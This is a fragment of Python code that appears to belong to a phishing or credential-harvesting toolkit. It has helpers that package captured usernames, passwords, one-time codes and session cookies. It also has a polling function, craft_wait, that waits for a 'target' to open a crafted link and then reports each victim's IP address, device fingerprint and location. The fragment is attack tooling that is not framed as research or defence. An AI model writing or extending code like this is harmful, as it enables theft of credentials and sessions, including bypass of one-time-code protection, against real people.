    return {"ip": o.ip, "ua": o.user_agent, "time": o.time}


def _cred_dict(c: CredCapture) -> Dict[str, Any]:
    return {"ip": c.ip, "username": c.username, "password": c.password,
            "otp": c.otp, "time": c.time}


def _session_dict(s: Any) -> Dict[str, Any]:
    return {"ip": s.ip, "username": s.username, "cookies": s.cookies,
            "ua": s.user_agent, "time": s.time}


def craft_wait(code: str, timeout: float = 300.0, interval: float = 5.0) -> List[Dict[str, Any]]:
    """Blocking poll: returns every new hit until `timeout`. Ctrl+C stops it."""
    import time
    store = _store()
    seen: set = set()
    out: List[Dict[str, Any]] = []
    deadline = time.time() + timeout
    notifier.status(f"Waiting for the target... (Ctrl+C to stop, {int(timeout)}s)")
    while time.time() < deadline:
        try:
            hits = store.hits(code) if store is not None else []
        except Exception:
            hits = []
        fresh = [h for h in hits if h.ip not in seen]
        for h in fresh:
            seen.add(h.ip)
            out.append(_hit_dict(h))
            fp = "/".join(x for x in (h.os, h.device, h.browser) if x) or "device?"
            loc = f"  [{h.geo}]" if h.geo else ""
            notifier.success(f"⚡ HIT {h.ip}  {fp}{loc}  {h.user_agent[:36]}")
        time.sleep(interval)
    return out